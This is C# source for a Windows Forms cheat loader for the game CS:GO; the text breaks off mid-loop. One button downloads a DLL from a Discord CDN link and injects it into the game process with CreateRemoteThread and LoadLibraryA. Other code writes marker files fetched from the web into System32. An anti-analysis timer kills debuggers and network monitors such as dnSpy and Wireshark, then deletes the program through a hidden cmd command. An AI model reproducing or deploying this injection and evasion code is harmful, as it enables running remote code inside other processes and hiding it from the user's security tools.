        #region usings
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Data;
using System.Windows.Forms;
using System.Text;
using System.Runtime.InteropServices;
using System.IO.Compression;
using juiceboxes_loader.users;
using juiceboxes_loader.io;
#endregion
        #region vsgen
namespace juiceboxes_loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        #endregion
        #region uselessshit
        private void Panel5_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Button1_Click(object sender, EventArgs e)
        {

        }

        private void Button2_Click(object sender, EventArgs e)
        {

        }

        private void Button3_Click(object sender, EventArgs e)
        {

        }

        private void Panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void Panel2_Click(object sender, EventArgs e)
        {

        }
        #endregion
        #region injection

        [DllImport("kernel32")]
        public static extern IntPtr CreateRemoteThread(
          IntPtr hProcess,
          IntPtr lpThreadAttributes,
          uint dwStackSize,
          UIntPtr lpStartAddress, // raw Pointer into remote process
          IntPtr lpParameter,
          uint dwCreationFlags,
          out IntPtr lpThreadId
        );

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 dwDesiredAccess,
            Int32 bInheritHandle,
            Int32 dwProcessId
            );

        [DllImport("kernel32.dll")]
        public static extern Int32 CloseHandle(
        IntPtr hObject
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint dwFreeType
            );

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        public static extern UIntPtr GetProcAddress(
            IntPtr hModule,
            string procName
            );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect
            );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            string lpBuffer,
            UIntPtr nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(
            string lpModuleName
            );

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
        internal static extern Int32 WaitForSingleObject(
            IntPtr handle,
            Int32 milliseconds
            );

        public Int32 GetProcessId(String proc)
        {
            Process[] ProcList;
            ProcList = Process.GetProcessesByName(proc);
            return ProcList[0].Id;
        }


        public void InjectDLL(IntPtr hProcess, String strDLLName)
        {
            IntPtr bytesout;

            Int32 LenWrite = strDLLName.Length + 1;
            IntPtr AllocMem = (IntPtr)VirtualAllocEx(hProcess, (IntPtr)null, (uint)LenWrite, 0x1000, 0x40);

            WriteProcessMemory(hProcess, AllocMem, strDLLName, (UIntPtr)LenWrite, out bytesout);
            UIntPtr Injector = (UIntPtr)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            if (Injector == null)
            {
                MessageBox.Show(" Injector Error! \n ");
                return;
            }
            IntPtr hThread = (IntPtr)CreateRemoteThread(hProcess, (IntPtr)null, 0, Injector, AllocMem, 0, out bytesout);
            if (hThread == null)
            {
                MessageBox.Show(" hThread [ 1 ] Error! \n ");
                return;
            }
            int Result = WaitForSingleObject(hThread, 10 * 1000);
            if (Result == 0x00000080L || Result == 0x00000102L || Result == 0xFFFFFFFF)
            {
                MessageBox.Show(" hThread [ 2 ] Error! \n ");
                if (hThread != null)
                {
                    CloseHandle(hThread);
                }
                return;
            }
            Thread.Sleep(1000);
            VirtualFreeEx(hProcess, AllocMem, (UIntPtr)0, 0x8000);

            if (hThread != null)
            {
                CloseHandle(hThread);
            }
            return;
        }



        public void Button2_Click_1(object sender, EventArgs e)
        {
            try
            {
                using (var webclient = new WebClient())
                {
                    string address = "https://cdn.discordapp.com/attachments/591676127852888065/595309170069209184/supremacy.dll";
                    string fileName = @"C:\Temp\supremacy.dll";
                    string cs = "csgo";
                    webclient.DownloadFile(address, fileName);

                    if (Process.GetProcessesByName(cs).Length == 1)
                    {
                        Int32 processid = GetProcessId(cs);
                        if (processid >= 0)
                        {
                            IntPtr hProcess = (IntPtr)OpenProcess(0x1F0FFF, 1, processid);

                            try
                            {
                                if (hProcess == null)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: Indicator: Injection failed", stuff.text, button, icon);
                                    return;
                                }
                                else
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Exclamation;
                                    InjectDLL(hProcess, fileName);
                                    MessageBox.Show("Juiceboxes Debug has been injected sucessfully!", stuff.text, button, icon);
                                }
                            }
                            catch (Exception ex)
                            {
                                var button = MessageBoxButtons.OK;
                                var icon = MessageBoxIcon.Error;
                                MessageBox.Show("Error: " + ex, stuff.text, button, icon);
                                return;
                            }
                        }
                        else
                        {
                            // do nothing
                        }
                    }
                    else
                    {
                        var button = MessageBoxButtons.OK;
                        var icon = MessageBoxIcon.Error;
                        MessageBox.Show("Error: Please start CS:GO first", stuff.text, button, icon);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex, stuff.text);
                return;
      
            }
        }
        #endregion
        #region formload
        private void Form1_Load(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            CreateDirectories.Create();

            timer2.Start();
            timer4.Start();


            string file = "C:\\Windows\\System32\\skipped11.txt";
            if (File.Exists(file))
            {

            }
            else
            {
                MessageBox.Show("Welcome to sippin' juiceboxes!");
                Thread.Sleep(100);
                string file1 = "C:\\Windows\\System32\\skipped11.txt";
                client.DownloadFile("https://master.tus.io/files/697c615a79026cbb89a19a0da0ccfdb3+Cw2TlDcgfMZmqZ55lNu31t1q9EaQhATaWB09LtXKEfPJtYb3UwRNqqjF0NPB.YBrnyVgB1IrvoDSdXjpnbqPWEZS4GxMob2jwI8KVYOs7W.rXG5nKZ9_ZF36XKqRb9pq", file1);
                MessageBox.Show("Current TOS: " +
                    "no tos since its open src lmfao");
                MessageBox.Show("xxx");
                Thread.Sleep(10);
                MessageBox.Show("Configs by: user1, user2, user3, user4");
            }

        }
        #endregion
        #region user1's cfg
        private void dlcfg1(object sender, EventArgs e)
        {
            if (!File.Exists("C:\\configs\\user1\\user1.zip"))
            {
                try
                {
                    using (var webclient = new WebClient())
                    {
                        if (!checkBox1.Checked)
                        {
                            if (checkBox2.Checked)
                            {
                                string address = "";
                                string filename = "C:\\configs\\user\\user1";

                                webclient.DownloadFile(address, filename);

                                try
                                {
                                    if (File.Exists(filename))
                                    {
                                        string extract = @"C:\configs\user1\extract";
                                        File.ReadAllBytes(filename);
                                        ZipFile.ExtractToDirectory(filename, extract);
                                    }
                                    else
                                    {
                                        var button = MessageBoxButtons.OK;
                                        var icon = MessageBoxIcon.Information;
                                        webclient.DownloadFile(address, filename);
                                        MessageBox.Show("File is being downloaded", stuff.text, button, icon);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, icon);
                                    return;
                                }
                            }
                            else
                            {
                                WebClient client = new WebClient();

                                string address = "";
                                string filename = "C:\\configs\\user1\\user1.zip";

                                client.DownloadFile(address, filename);

                                var button = MessageBoxButtons.OK;
                                var icon = MessageBoxIcon.Information;

                                MessageBox.Show("user1's package has been downloaded please check C:\\configs\\user1\\ directory", stuff.text, button, icon);
                            }
                        }
                        else
                        {
                            if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup"))
                            {
                                try
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("Files have been downloaded, check your supremacy configs directory!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var errorbutton = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, errorbutton, icon);
                                }
                            }
                            else
                            {
                                try
                                {
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("File have been downloaded and replaced sucessfully!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var error = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, error);
                                    return;
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    var button = MessageBoxButtons.OK;
                    var error = MessageBoxIcon.Error;
                    MessageBox.Show("Error: {ex}" + ex, stuff.text, button, error);
                }
            }
            else
            {
                var button = MessageBoxButtons.OK;
                var icon = MessageBoxIcon.Information;
                MessageBox.Show("Error: The config package has been downloaded before, please check C:\\configs\\user1\\ directory again", stuff.text, button, icon);
            }
        }
        #endregion
        #region exit
        private void Button1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }
        #endregion
        #region contact
        private void Button3_Click_1(object sender, EventArgs e)
        {
            var button = MessageBoxButtons.OK;
            var icon = MessageBoxIcon.Information;
            MessageBox.Show("Owner's discord: xxx", stuff.text, button, icon);
        }
        #endregion
        #region uselessshit v2
        private void Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }
        #endregion
        #region some formatting
        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
                checkBox2.Enabled = false;
            else
                checkBox2.Enabled = true;
        }
        #endregion
        #region useless shit v3
        private void Panel5_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void Label5_Click(object sender, EventArgs e)
        {

        }
        #endregion
        #region user2's cfg
        private void dlcfg(object sender, EventArgs e)
        {
            if (!File.Exists("C:\\configs\\user2\\user2.zip"))
            {
                try
                {
                    using (var webclient = new WebClient())
                    {
                        if (!checkBox1.Checked)
                        {
                            if (checkBox2.Checked)
                            {
                                string address = "";
                                string filename = "C:\\configs\\user2\\user2.zip";

                                webclient.DownloadFile(address, filename);

                                try
                                {
                                    if (File.Exists(filename))
                                    {
                                        string extract = @"C:\configs\user2\extract";
                                        File.ReadAllBytes(filename);
                                        ZipFile.ExtractToDirectory(filename, extract);
                                    }
                                    else
                                    {
                                        var button = MessageBoxButtons.OK;
                                        var icon = MessageBoxIcon.Information;
                                        webclient.DownloadFile(address, filename);
                                        MessageBox.Show("File is being downloaded", stuff.text, button, icon);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, icon);
                                    return;
                                }
                            }
                            else
                            {
                                WebClient client = new WebClient();

                                string address = "";
                                string filename = "C:\\configs\\user2\\user2.zip";

                                client.DownloadFile(address, filename);

                                var button = MessageBoxButtons.OK;
                                var icon = MessageBoxIcon.Information;

                                MessageBox.Show("user2' s package has been downloaded please check C:\\configs\\user2\\ directory", stuff.text, button, icon);
                            }
                        }
                        else
                        {
                            if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup"))
                            {
                                try
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("Files have been downloaded, check your supremacy configs directory!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var errorbutton = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, errorbutton, icon);
                                }
                            }
                            else
                            {
                                try
                                {
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("File have been downloaded and replaced sucessfully!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var error = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, error);
                                    return;
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    var button = MessageBoxButtons.OK;
                    var error = MessageBoxIcon.Error;
                    MessageBox.Show("Error: " + ex, stuff.text, button, error);
                }
            }
            else
            {
                var button = MessageBoxButtons.OK;
                var icon = MessageBoxIcon.Information;
                MessageBox.Show("Error: The config package has been downloaded before, please check C:\\configs\\user2\\ directory again", stuff.text, button, icon);
            }
        }
        #endregion
        #region urloutdated
        private void Label4_Click(object sender, EventArgs e)
        {
            var button = MessageBoxButtons.OK;
            var icon = MessageBoxIcon.Information;
            MessageBox.Show("URL might be outdated, so if it is please contact xxx on discord", stuff.text, button, icon);
            return;
        }
        #endregion
        #region useless shit v4
        private void Panel6_Paint(object sender, PaintEventArgs e)
        {

        }
        #endregion
        #region user3's cfg
        private void configdl(object sender, EventArgs e)
        {
            if (!File.Exists("C:\\configs\\user3\\user3.zip"))
            {
                try
                {
                    using (var webclient = new WebClient())
                    {
                        if (!checkBox1.Checked)
                        {
                            if (checkBox2.Checked)
                            {
                                string address = "";
                                string filename = "C:\\configs\\user3\\user3.zip";

                                webclient.DownloadFile(address, filename);

                                try
                                {
                                    if (File.Exists(filename))
                                    {
                                        string extract = @"C:\configs\user3\extract";
                                        File.ReadAllBytes(filename);
                                        ZipFile.ExtractToDirectory(filename, extract);
                                    }
                                    else
                                    {
                                        var button = MessageBoxButtons.OK;
                                        var icon = MessageBoxIcon.Information;
                                        webclient.DownloadFile(address, filename);
                                        MessageBox.Show("File is being downloaded", stuff.text, button, icon);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, icon);
                                    return;
                                }
                            }
                            else
                            {
                                WebClient client = new WebClient();

                                string address = "";
                                string filename = "C:\\configs\\user3\\user3.zip";

                                client.DownloadFile(address, filename);

                                var button = MessageBoxButtons.OK;
                                var icon = MessageBoxIcon.Information;

                                MessageBox.Show("user3s package has been downloaded please check C:\\configs\\user3\\ directory", stuff.text, button, icon);
                            }
                        }
                        else
                        {
                            if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup"))
                            {
                                try
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("Files have been downloaded, check your supremacy configs directory!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var errorbutton = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, errorbutton, icon);
                                }
                            }
                            else
                            {
                                try
                                {
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("File have been downloaded and replaced sucessfully!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var error = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, error);
                                    return;
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    var button = MessageBoxButtons.OK;
                    var error = MessageBoxIcon.Error;
                    MessageBox.Show("Error: {ex}" + ex, stuff.text, button, error);
                }
            }
            else
            {
                var button = MessageBoxButtons.OK;
                var icon = MessageBoxIcon.Error;
                MessageBox.Show("Error: The config package has been downloaded before, please check C:\\configs\\user3\\ directory again", stuff.text, button, icon);
            }
        }
        #endregion
        #region config information
        private void Label8_Click(object sender, EventArgs e)
        {
            var button = MessageBoxButtons.OK;
            var icon = MessageBoxIcon.Information;

            MessageBox.Show("Config files: 1.sup = auto,  2.sup = scout,  4.sup = awp", stuff.text, button, icon);
        }
        #endregion
        #region hwids & users
        private void Timer2_Tick(object sender, EventArgs e)
        {
            string hwid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
            string user1 = "";
            string user2 = "";
            string user3 = "";
            string user4 = "";
            string user5 = "";
            string user6 = "";
            string user7 = "";

            if (hwid == user1 || hwid == user2 || hwid == user3 || hwid == user4 || hwid == user5 || hwid == user6 || hwid == user7)
            {
                if (hwid == user1)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user2)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user3)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user4)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user5)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user6)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
                else if (hwid == user7)
                {
                    label9.Text = "sippin' juiceboxes | logged as: user";
                }
            }
            else
            {
                Application.Exit();
            }
        }
        #endregion
        #region useless shit v5
        private void Panel7_Paint(object sender, PaintEventArgs e)
        {

        }
        #endregion
        #region user4's cfg
        private void dl4(object sender, EventArgs e)
        {
            if (!File.Exists("C:\\configs\\user4\\user4.zip"))
            {
                try
                {
                    using (var webclient = new WebClient())
                    {
                        if (!checkBox1.Checked)
                        {
                            if (checkBox2.Checked)
                            {
                                string filename = "C:\\configs\\user4\\user4.zip";
                                string address = "";

                                webclient.DownloadFile(address, filename);

                                try
                                {
                                    if(File.Exists(filename))
                                    {
                                        string extract = @"C:\configs\user4\extract";
                                        File.ReadAllBytes(filename);
                                        ZipFile.ExtractToDirectory(filename, extract);
                                    }
                                    else
                                    {
                                        var button = MessageBoxButtons.OK;
                                        var icon = MessageBoxIcon.Information;
                                        webclient.DownloadFile(address, filename);
                                        MessageBox.Show("File is being downloaded", stuff.text, button, icon);
                                    }
                                }
                                catch(Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, icon);
                                    return;
                                }
                            }
                            else
                            {
                                WebClient client = new WebClient();

                                string filename = "C:\\configs\\user4\\user4.zip";
                                string address = "";

                                client.DownloadFile(address, filename);


                                var button = MessageBoxButtons.OK;
                                var icon = MessageBoxIcon.Information;

                                MessageBox.Show("user4s package has been downloaded please check C:\\configs\\user4\\ directory", stuff.text, button, icon);
                            }
                        }
                        else
                        {
                            if (!File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup") && !File.Exists(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup"))
                            {
                                try
                                {
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("File have been downloaded and replaced sucessfully!", stuff.text, button, icon);
                                }
                                catch (Exception ex)
                                {
                                    var errorbutton = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, errorbutton, icon);
                                }
                            }
                            else
                            {
                                try
                                {
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\1.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    var button = MessageBoxButtons.OK;
                                    var icon = MessageBoxIcon.Information;
                                    string filename1 = (@"C:\Users" + Environment.UserName + @"Documents\1.sup");
                                    string filename2 = (@"C:\Users\" + Environment.UserName + @"\Documents\\2.sup");
                                    string filename3 = (@"C:\Users\" + Environment.UserName + @"\Documents\\4.sup");
                                    webclient.DownloadFile("", filename1);
                                    webclient.DownloadFile("", filename2);
                                    webclient.DownloadFile("", filename3);
                                    MessageBox.Show("File have been downloaded and replaced sucessfully!", stuff.text, button, icon);
                                }
                                catch(Exception ex)
                                {
                                    var button = MessageBoxButtons.OK;
                                    var error = MessageBoxIcon.Error;
                                    MessageBox.Show("Error: " + ex, stuff.text, button, error);
                                    return;
                                }
                            }
                        }
                    }
                }
                catch(Exception ex)
                {
                    var button = MessageBoxButtons.OK;
                    var error = MessageBoxIcon.Error;
                    MessageBox.Show("Error: {ex}" + ex, stuff.text, button, error);
                }
            }
            else
            {
                var button = MessageBoxButtons.OK;
                var icon = MessageBoxIcon.Error;
                MessageBox.Show("Error: The config package has been downloaded before, please check C:\\configs\\user4\\ directory again", stuff.text, button, icon);
            }
        }
        #endregion
        #region anti-crack & anti-debug
        private void Timer4_Tick(object sender, EventArgs e)
        {
            string fileName1 = "C:\\Windows\\System32\\checkcock.txt";
            if (File.Exists(fileName1))
            {
                Application.Exit();
            }
            else
            {
                // do nothing
            }

            WebClient webClient = new WebClient();
            string fileName = "C:\\Windows\\System32\\checkcock.txt";
            Process.GetProcesses();
            Process[] processesByName = Process.GetProcessesByName("ProcessHacker");
            for (int i = 0; i < processesByName.Length; i++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[i].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("dnSpy");
            for (int j = 0; j < processesByName.Length; j++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[j].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("Fiddler");
            for (int k = 0; k < processesByName.Length; k++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[k].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("PEiD.exe");
            for (int l = 0; l < processesByName.Length; l++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[l].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("Universal_Fixer");
            for (int m = 0; m < processesByName.Length; m++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[m].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("MegaDumper");
            for (int n = 0; n < processesByName.Length; n++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[n].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("Wireshark");
            for (int num = 0; num < processesByName.Length; num++)
            {
                webClient.DownloadFile("https://master.tus.io/files/b7d7450f9f18a709e436b7c17ca7409a+Uv3gWJFFZe4EZDJyCixDhAuv0YvWaA4Rwtro9wlQ6QExQU0Tv7XXmLqTSchi13zz47OCJLV7Ze0AWZmCPwwGCUqPPiKM1UDcGW54GFYICkQ2kiD0PoqnCAwy40D3y1UW", fileName);
                processesByName[num].Kill();
                Process.Start(new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
                    FileName = "cmd.exe"
                });
            }
            processesByName = Process.GetProcessesByName("OllyDbg");
            for (int num2 = 0; num2 < processesByName.Length; num2++)
            {
